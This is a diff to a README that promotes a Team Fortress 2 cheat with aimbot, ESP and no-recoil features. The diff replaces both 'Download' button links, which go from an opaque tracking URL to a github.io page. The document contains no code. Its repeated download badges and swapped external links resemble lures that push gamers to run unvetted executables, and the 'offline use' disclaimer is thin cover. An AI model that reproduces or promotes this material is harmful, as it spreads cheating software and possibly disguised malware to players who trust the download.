@@ -2,7 +2,7 @@
 
 The **TF2 Cheat** is a comprehensive tool designed to enhance your gameplay in **Team Fortress 2 (TF2)**. This cheat provides a variety of features such as **aimbot**, **ESP (Extra Sensory Perception)**, **no recoil**, and more to give you a competitive edge. It allows you to automate aiming, improve accuracy, and reveal important in-game information, making it easier to dominate your opponents. This tool is intended for **offline use** and **personal testing** only.
 
-[![Download TF2 Cheat](https://img.shields.io/badge/Download-TF2%20Cheat-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download TF2 Cheat](https://img.shields.io/badge/Download-TF2%20Cheat-blueviolet)](https://tf-2-cheat.github.io/.github/)
 
 ## Features
 
@@ -23,4 +23,4 @@ The **TF2 Cheat** is a comprehensive tool designed to enhance your gameplay in *
 4. Launch **TF2** and activate the cheat using the hotkey specified in the settings.
 5. Customize the cheat’s features (aimbot, ESP, recoil, etc.) to match your desired playstyle.
 
-[![Download TF2 Cheat](https://img.shields.io/badge/Download-TF2%20Cheat-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download TF2 Cheat](https://img.shields.io/badge/Download-TF2%20Cheat-blueviolet)](https://tf-2-cheat.github.io/.github/)
